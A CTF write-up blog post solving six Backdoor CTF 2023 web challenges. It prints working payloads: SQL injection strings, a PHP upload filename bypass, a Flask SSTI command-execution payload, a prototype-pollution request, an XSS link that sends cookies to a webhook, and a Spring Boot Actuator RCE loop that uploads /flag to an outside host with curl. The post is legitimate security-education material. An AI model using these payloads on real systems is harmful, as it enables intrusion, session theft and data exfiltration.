---
layout: post
title: Backdoor CTF 2023 Web Challenges
author: m0z
categories: [Jeopardy]
tags: [ctf,web]
---

## web/too-many-admins
Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql).

I immediately noticed the SQL injection here:

```php
$query = "SELECT username, password, bio FROM users where username = '$userParam' ";
```
Trying a simple blind SQLi payload `1'or'1'='1` on the `user` GET parameter reveals the entire database (limited to `id`, `user` and `password`).
I immediately noticed many of the hashes were [Magic Hashes](https://medium.com/@codingkarma/not-so-obvious-php-vulnerabilities-388a3b7bf2dc).

This is a hash which begins with `0e` followed by a string of numerical values. PHP has a difficult time with these hashes because it evaluates them to be loosely equal to zero due to PHP treating `e` as a symbol for an exponent.
So I wrote up a script to try `240610708` as the password for each admin user (there are 500).

While this script was running, I realized that the SQL injection vulnerability would actually allow us to dump the flag if we use a UNION query. Since the flag is stored in the `bio` column, we can simply use `1' UNION SELECT null, bio, null FROM users-- -` to dump the flag.

In the end, both techniques worked. Judging from the flag, the intended solution was actually the magic hash approach.

`flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}`

## web/php-sucks
Opening the source for this challenge we notice the flag is a file on the server this time. With only a file upload, it is pretty clear that we will require an arbitrary file upload vulnerability to read the flag.

All the PHP code was in a single line so the first thing I did was paste this into a PHP beautifier. This made it easier to see what was happening in the code.

The implementation looked pretty secure. However, there was one line in particular that I didn't like:
```php
$fileName=strtok($fileName,chr(7841151584512418084));
```
This modified the filename; splitting it by a token and taking the first instance of the resulting array. What's strange is that `chr(7841151584512418084)` doesn't correspond to a normal character. I decided to run this PHP code and see what symbol it corresponded to and was pleasantly surprised that it was `$`.

So, we can upload a file named `shell.php$.jpg` and we will pass the initial file extension checks, ensure that the mimetype check is also satisfied. Then, it will be later renamed to `shell.php` by the aforementioned call to `strtok()`.

So uploading an image containing PHP code somewhere inside it (which is still a valid image) will work. After uploading, I found the flag and ran the command to view it `cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt`.

`flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}`

## web/Unintelligible-Chatbot
This was the first sourceless challenge on the CTF. I pretty quickly tested for most obvious injection types include XSS and SSTI. Our SSTI payload seemed to work (`\{\{7*7\}\}` => `49`).

From initial checks, it seems to be blocking any SSTI payloads with `[]` or `.` which means we will have a difficult time accessing dictionary values. If you're used to SSTI challenges then you'll know flask has a bunch of useful approaches to handle this including the `|attr()` method.

I'd love to elaborate more on this solution but this is one of the first things I tried and it worked. 
```python
\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()\}\}
```
`flag{n07_4n07h3r_5571_ch4ll3n63}`

## web/space-war
I felt like this was among the more "guessier" of challenges. The description mentioned letters being split up amongst various routes. So I decided to fuzz for all printable characters and found a response at `/K`. I then wrote the following script to recover the other characters:

```python
import requests
import string

o = ""

while True:
    for s in string.printable:
        r = requests.get(f"http://34.132.132.69:8005/{o}{s}")
        if "wrong path" not in r.text:
            o += s
            print(o)
            break

```

Eventually after getting `Kur0s4k1` we see the following message:

`Ohhhh myy Goddd!! you finally did it!! you are worthy, my name Kur0s4k1`

I then logged in with username `Kur0s4k1` and password `1"or"1"="1` which worked.

`flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}`

## web/armoured-notes
This was probably my favourite challenge on the CTF. We open the source code and see the flag is stored as a cookie on the admin bot. This means we will likely require XSS to solve this challenge.

However, we cannot create notes on this application as we are not an administrator. I pretty quickly noticed the dodgy usage of `Object.assign()` in the `duplicate()` method:

```javascript
export  function  duplicate(body) {
	let  obj={}
	let  keys  =  Object.keys(body);
	keys.forEach((key) => {
		if(key  !==  "isAdmin")
		obj[key]=body[key];
	})
	return  obj;
}
```

After seeing the hardcoded check for `isAdmin`, I realized that if we could add this as a field to our note when creating it (and set it to true), we could successfully overwrite the default value. This can be done using a prototype pollution.

```json
POST /create

{
	"uname":"John",
	"pass":"Doe",
	"__proto__": {
		"isAdmin": true
	},
	"message":"Your note..."
}
```

This successfully bypassed the check and created our note. I got stuck at this point for a while until I eventually ran `npm audit` and discovered there was a public XSS exploit available for ViteJS.
All the information needed to exploit this can be found [here](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title).

Final payload which I sent to the admin bot:
```
http://34.132.132.69:8001/posts/6580526999d634eec4c73707/?"></script><script>window.location.href=`https://webhook.site/77b428d2-33c2-437f-8425-9ef657cdacea/${btoa(document.cookie)}`</script>
```

`flag{pR0707yP3_p0150n1n9_AND_v173j5_5ay_n01c3_99}`

## web/Rocket Explorer
Credit to Protag (@0daystolive) for immediately noticing that this was vulnerable to an exposed Spring Boot Actuator ([exploit here](https://github.com/spaceraccoon/spring-boot-actuator-h2-rce)). The main challenge here was due to the server consistently crashing.

I had tried to get a reverse shell for a long time but this was not working. I was able to get a pingback but had no idea where the flag was located on the server and wasn't getting a successful backconnect from the shell payload.

I ended up having to guess various flag locations and spam requests to get the flag. I wrote this bash script to guess `/flag` which successfully worked.

```bash
while true
do
        curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream());  if (s.hasNext()) {s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'curl -T /flag <webhook>\');\"}' 'http://34.173.50.60:8080/actuator/env'
        curl -X 'POST' -H 'Content-Type: application/json' 'http://34.173.50.60:8080/actuator/restart'
done
```

`flag{sp4c3_r4cc00ns_rc3}`
